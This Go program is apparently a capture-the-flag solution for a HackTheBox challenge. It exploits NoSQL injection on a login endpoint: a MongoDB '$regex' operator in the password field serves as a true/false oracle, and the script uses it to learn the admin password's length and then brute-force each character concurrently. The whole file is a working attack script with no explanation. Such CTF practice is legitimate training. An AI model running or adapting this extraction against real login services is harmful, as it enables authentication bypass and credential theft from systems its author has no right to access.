package main

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"strings"
	"sync"

	"net/http"
)

const THREADS = 100

var guard = make(chan struct{}, THREADS)
var wg sync.WaitGroup
var baseUrl string

func oracle(reqBody string) bool {
	guard <- struct{}{}

	req, _ := http.NewRequest("POST", baseUrl+"/api/login", bytes.NewBuffer([]byte(reqBody)))
	req.Header.Set("Content-Type", "application/json")

	res, err := (&http.Client{}).Do(req)

	if err != nil {
		<-guard
		return false
	}

	defer res.Body.Close()

	body, err := io.ReadAll(res.Body)

	if err != nil {
		panic(err)
	}

	<-guard
	return bytes.Contains(body, []byte("Success"))
}

func testLength(length int) bool {
	reqBody := fmt.Sprintf(`{"username":"admin","password":{"$regex":"HTB{%s}"}}`, strings.Repeat(".", length))

	return oracle(reqBody)
}

func testPasswordCharacter(password string) bool {
	reqBody := fmt.Sprintf(`{"username":"admin","password":{"$regex":"HTB{%s}"}}`, password)

	return oracle(reqBody)
}

func main() {
	baseUrl = "http://" + os.Args[1]
	chars := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$@_"

	length := 1

	for !testLength(length) {
		length++
	}

	flag := make([]byte, length)

	for _, r := range chars {
		for i := 0; i < length; i++ {
			wg.Add(1)

			go func(b byte, index int) {
				defer wg.Done()
				password := bytes.Repeat([]byte{'.'}, length)
				password[index] = b

				if flag[index] == 0 && testPasswordCharacter(string(password)) {
					flag[index] = b
				}
			}(byte(r), i)
		}
	}

	wg.Wait()

	fmt.Println("HTB{" + string(flag) + "}")
}
